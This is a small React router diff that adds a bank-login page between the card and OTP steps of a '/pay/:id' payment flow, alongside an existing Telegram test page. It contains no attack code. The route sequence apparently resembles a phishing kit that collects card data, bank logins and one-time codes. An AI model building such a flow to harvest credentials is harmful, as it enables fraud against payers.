@@ -13,6 +13,7 @@ import PaymentDetails from "./pages/PaymentDetails";
 import PaymentCardForm from "./pages/PaymentCardForm";
 import PaymentOTPForm from "./pages/PaymentOTPForm";
 import PaymentReceiptPage from "./pages/PaymentReceiptPage";
+import BankLogin from "./pages/BankLogin";
 import TelegramTestPage from "./pages/TelegramTestPage";
 import NotFound from "./pages/NotFound";
 
@@ -33,6 +34,7 @@ const App = () => (
           <Route path="/pay/:id/recipient" element={<PaymentRecipient />} />
           <Route path="/pay/:id/details" element={<PaymentDetails />} />
           <Route path="/pay/:id/card" element={<PaymentCardForm />} />
+          <Route path="/pay/:id/bank-login" element={<BankLogin />} />
           <Route path="/pay/:id/otp" element={<PaymentOTPForm />} />
           <Route path="/pay/:id/receipt" element={<PaymentReceiptPage />} />
           <Route path="/telegram-test" element={<TelegramTestPage />} />
